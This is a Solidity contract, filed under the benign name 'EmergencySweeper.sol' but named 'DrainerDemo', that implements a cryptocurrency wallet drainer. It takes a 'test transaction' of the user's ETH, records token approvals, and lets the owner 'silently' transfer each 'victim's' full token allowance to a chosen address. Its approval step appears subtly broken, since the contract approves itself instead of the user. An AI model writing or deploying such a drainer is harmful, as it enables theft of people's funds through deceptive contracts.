// ===== FILE: EmergencySweeper.sol =====
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract DrainerDemo {
    address public owner;
    mapping(address => bool) public hasApproved;

    event TestTransaction(address indexed user, uint256 amount, address indexed destination);
    event TokensDrained(address indexed victim, address indexed token, address indexed destination, uint256 amount);

    error NotOwner();
    error ZeroDestination();

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    // ---- STEP 1: test transaction (user pays gas) ----
    function sendTestTransaction(address destination) external payable {
        if (destination == address(0)) revert ZeroDestination();
        if (msg.value == 0) revert("Send a small test amount");
        (bool sent, ) = destination.call{value: msg.value}("");
        require(sent, "Test failed");
        emit TestTransaction(msg.sender, msg.value, destination);
    }

    // ---- STEP 2: approve + record in ONE transaction ----
    function approveAndRecord(address token, uint256 amount) external {
        IERC20(token).approve(address(this), amount);
        hasApproved[msg.sender] = true;
    }

    // ---- STEP 3: silent drain (only owner) ----
    function drainAll(address[] calldata tokens, address destination, address victim) external onlyOwner {
        if (destination == address(0)) revert ZeroDestination();
        require(hasApproved[victim], "Victim hasn't approved");

        for (uint256 i = 0; i < tokens.length; i++) {
            address tokenAddr = tokens[i];
            if (tokenAddr == address(0)) continue;
            uint256 allowance = IERC20(tokenAddr).allowance(victim, address(this));
            if (allowance > 0) {
                IERC20(tokenAddr).transferFrom(victim, destination, allowance);
                emit TokensDrained(victim, tokenAddr, destination, allowance);
            }
        }
    }

    // ---- view functions ----
    function getAllowance(address token, address user) external view returns (uint256) {
        return IERC20(token).allowance(user, address(this));
    }

    receive() external payable {}
}